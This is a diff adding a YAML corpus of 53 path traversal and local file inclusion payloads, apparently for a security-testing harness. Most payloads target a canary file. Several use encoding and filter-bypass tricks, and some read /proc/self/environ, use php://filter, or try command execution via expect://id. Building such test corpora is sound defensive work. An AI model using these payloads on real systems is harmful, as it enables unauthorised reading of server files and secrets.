@@ -1,0 +1,451 @@
+# AMHF Payload Corpus — Path Traversal / LFI
+# Educational use only. Sources: OWASP, PortSwigger,
+# PayloadsAllTheThings.
+# Total: 53 payloads.
+
+- id: pt_basic_001
+  class: pathtrav
+  payload: ../etc/amhf_canary
+  description: Один уровень вверх
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_002
+  class: pathtrav
+  payload: ../../etc/amhf_canary
+  description: Два уровня
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_003
+  class: pathtrav
+  payload: ../../../etc/amhf_canary
+  description: Три уровня
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_004
+  class: pathtrav
+  payload: ../../../../etc/amhf_canary
+  description: Четыре уровня
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_005
+  class: pathtrav
+  payload: ../../../../../etc/amhf_canary
+  description: Пять уровней
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_006
+  class: pathtrav
+  payload: ../../../../../../etc/amhf_canary
+  description: Шесть уровней
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_007
+  class: pathtrav
+  payload: ../../../../../../../etc/amhf_canary
+  description: Семь уровней
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_008
+  class: pathtrav
+  payload: ../../../../../../../../etc/amhf_canary
+  description: Восемь уровней (для глубоких chroot)
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_009
+  class: pathtrav
+  payload: /etc/amhf_canary
+  description: Абсолютный путь
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: OWASP Path Traversal
+- id: pt_basic_010
+  class: pathtrav
+  payload: ./../../etc/amhf_canary
+  description: Префикс ./
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: OWASP Path Traversal
+- id: pt_enc_001
+  class: pathtrav
+  payload: ..%2fetc%2famhf_canary
+  description: Слеши в %2f
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_002
+  class: pathtrav
+  payload: ..%2F..%2Fetc%2Famhf_canary
+  description: Несколько уровней %2F
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_003
+  class: pathtrav
+  payload: '%2e%2e%2fetc%2famhf_canary'
+  description: Точки и слеш в hex
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_004
+  class: pathtrav
+  payload: '%2e%2e/etc/amhf_canary'
+  description: Только точки в hex
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_005
+  class: pathtrav
+  payload: ..%252fetc%252famhf_canary
+  description: Двойное URL-кодирование %252f
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_006
+  class: pathtrav
+  payload: '%252e%252e%252fetc%252famhf_canary'
+  description: Двойное всех символов
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_007
+  class: pathtrav
+  payload: ..%c0%afetc%c0%afamhf_canary
+  description: Overlong UTF-8 для /
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: hard
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_008
+  class: pathtrav
+  payload: ..%c1%9cetc%c1%9camhf_canary
+  description: Overlong UTF-8 для \
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: hard
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_009
+  class: pathtrav
+  payload: ..%5cetc%5camhf_canary
+  description: Backslash %5c (Windows)
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_010
+  class: pathtrav
+  payload: ..%255cetc%255camhf_canary
+  description: Двойное backslash
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_011
+  class: pathtrav
+  payload: ..%5C..%5Cetc%5Camhf_canary
+  description: Несколько уровней backslash
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_012
+  class: pathtrav
+  payload: ..%c0%2fetc%c0%2famhf_canary
+  description: Overlong на ../%2f
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: hard
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_013
+  class: pathtrav
+  payload: ..%u002fetc%u002famhf_canary
+  description: Unicode IIS legacy
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: PortSwigger Path Traversal encoding
+- id: pt_enc_014
+  class: pathtrav
+  payload: ..%uff0fetc%uff0famhf_canary
+  description: Fullwidth /
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: hard
+  source: PortSwigger Path Traversal encoding
+- id: pt_filter_001
+  class: pathtrav
+  payload: '....//etc//amhf_canary'
+  description: '....// — обход replace(''../'','''')'
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_002
+  class: pathtrav
+  payload: '.../...//etc/amhf_canary'
+  description: Микс длин для обхода
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_003
+  class: pathtrav
+  payload: '..././etc/amhf_canary'
+  description: Точка-слеш-точка
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_004
+  class: pathtrav
+  payload: ..%00/etc/amhf_canary
+  description: NULL-байт после ..
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_005
+  class: pathtrav
+  payload: ..%00%2fetc%2famhf_canary
+  description: NULL + %2f
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_006
+  class: pathtrav
+  payload: ../etc/amhf_canary%00.png
+  description: NULL truncation в конце
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_007
+  class: pathtrav
+  payload: "../etc/amhf_canary\0.txt"
+  description: Сырой NULL
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_008
+  class: pathtrav
+  payload: ../etc/./amhf_canary
+  description: /. в середине
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_009
+  class: pathtrav
+  payload: ../etc//amhf_canary
+  description: Двойной слеш
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_010
+  class: pathtrav
+  payload: ../etc////amhf_canary
+  description: Множественные слеши
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_011
+  class: pathtrav
+  payload: ../etc/amhf_canary?
+  description: Query-string обрыв
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_012
+  class: pathtrav
+  payload: ../etc/amhf_canary#
+  description: Fragment-обрыв
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_013
+  class: pathtrav
+  payload: ../etc/amhf_canary;
+  description: Параметр-разделитель ;
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_filter_014
+  class: pathtrav
+  payload: ../etc/amhf_canary%23
+  description: 'URL-encoded #'
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: OWASP Path Traversal filter bypass
+- id: pt_os_001
+  class: pathtrav
+  payload: ..\..\..\..\etc\amhf_canary
+  description: Windows backslash
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: easy
+  source: PayloadsAllTheThings LFI
+- id: pt_os_002
+  class: pathtrav
+  payload: ..%5c..%5c..%5cetc%5camhf_canary
+  description: URL-encoded backslash
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: easy
+  source: PayloadsAllTheThings LFI
+- id: pt_os_003
+  class: pathtrav
+  payload: \\..\..\..\etc\amhf_canary
+  description: UNC-style
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: medium
+  source: PayloadsAllTheThings LFI
+- id: pt_os_004
+  class: pathtrav
+  payload: file:///etc/amhf_canary
+  description: file:// URL
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: medium
+  source: PayloadsAllTheThings LFI
+- id: pt_os_005
+  class: pathtrav
+  payload: file:////etc/amhf_canary
+  description: file://// двойные слеши
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: medium
+  source: PayloadsAllTheThings LFI
+- id: pt_os_006
+  class: pathtrav
+  payload: php://filter/convert.base64-encode/resource=/etc/amhf_canary
+  description: PHP filter wrapper
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: hard
+  source: PayloadsAllTheThings LFI
+- id: pt_os_007
+  class: pathtrav
+  payload: php://filter/read=convert.base64-encode/resource=/etc/amhf_canary
+  description: PHP filter alternative
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: hard
+  source: PayloadsAllTheThings LFI
+- id: pt_os_008
+  class: pathtrav
+  payload: expect://id
+  description: Expect-wrapper для CMDi (PHP legacy)
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: hard
+  source: PayloadsAllTheThings LFI
+- id: pt_os_009
+  class: pathtrav
+  payload: /var/www/../../etc/amhf_canary
+  description: Префикс с реальным путём
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: easy
+  source: PayloadsAllTheThings LFI
+- id: pt_os_010
+  class: pathtrav
+  payload: /proc/self/environ
+  description: Чтение /proc/self/environ
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: medium
+  source: PayloadsAllTheThings LFI
+- id: pt_os_011
+  class: pathtrav
+  payload: /proc/self/cmdline
+  description: Чтение /proc/self/cmdline
+  expected_markers:
+  - amhf_canary_v1
+  - PATH=
+  - HOME=
+  difficulty: medium
+  source: PayloadsAllTheThings LFI
+- id: pt_fuzz_001
+  class: pathtrav
+  payload: ../../../../../../../../../../etc/amhf_canary
+  description: 10 уровней через repeat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: AMHF generated
+- id: pt_fuzz_002
+  class: pathtrav
+  payload: ../../../../../../../../../../../../../../../../etc/amhf_canary
+  description: 16 уровней
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: trivial
+  source: AMHF generated
+- id: pt_fuzz_003
+  class: pathtrav
+  payload: ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/amhf_canary
+  description: 10 уровней URL-encoded
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: AMHF generated
+- id: pt_fuzz_004
+  class: pathtrav
+  payload: '....//....//....//....//....//....//....//....//etc/amhf_canary'
+  description: '....// repeat'
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: AMHF generated
